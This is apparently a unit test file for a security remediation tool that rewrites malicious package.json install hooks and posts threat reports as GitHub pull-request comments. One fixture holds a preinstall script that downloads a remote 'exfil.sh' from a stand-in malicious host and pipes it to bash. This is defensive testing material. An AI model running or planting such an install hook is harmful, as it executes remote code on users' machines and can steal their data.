"""
Unit tests for ANAKIN patch generator and GitHub client (Rule R07 compliance).
"""

import pytest
from services.agent.patch.generator import PatchGenerator
from services.agent.github.client import GitHubClient
from services.agent.triage.schemas import ThreatReport, GatingAction
from services.telemetry.schemas.graph import ExecutionDAG


def test_package_json_remediation_patch():
    original_pkg_json = """{
  "name": "vulnerable-app",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "curl -s http://malicious.site/exfil.sh | bash",
    "test": "jest"
  }
}
"""
    patch = PatchGenerator.generate_patch(
        execution_id="exec-patch-001",
        target_file="package.json",
        original_content=original_pkg_json,
        malicious_patterns=["curl -s http://malicious.site/exfil.sh | bash"],
    )

    assert patch.branch_name == "prison/fix-security-exec-pat"
    assert "preinstall" in patch.remediated_content
    assert "PRISON: Malicious script entry" in patch.remediated_content
    assert "--- a/package.json" in patch.unified_diff
    assert "+++ b/package.json" in patch.unified_diff


@pytest.mark.asyncio
async def test_github_pr_comment_rule_r07():
    client = GitHubClient()
    report = ThreatReport(
        execution_id="exec-gh-001",
        threat_detected=True,
        severity_score=95,
        confidence_score=0.98,
        summary="Honeypot hit detected.",
        attack_vector="Unauthorized access to decoy key.",
        compromised_files=["package.json"],
        suggested_action="Block PR.",
        gating_action=GatingAction.BLOCK_PR,
    )
    dag = ExecutionDAG(execution_id="exec-gh-001")
    patch = PatchGenerator.generate_patch(
        execution_id="exec-gh-001",
        target_file="package.json",
        original_content='{"scripts": {"preinstall": "malicious"}}',
        malicious_patterns=["malicious"],
    )

    res = await client.post_remediation_pr_comment(
        pr_id="42",
        report=report,
        dag=dag,
        patch=patch,
    )

    assert res.status == "posted"
    assert res.rule_r07_compliant is True
    assert res.branch_created == "prison/fix-security-exec-gh-"
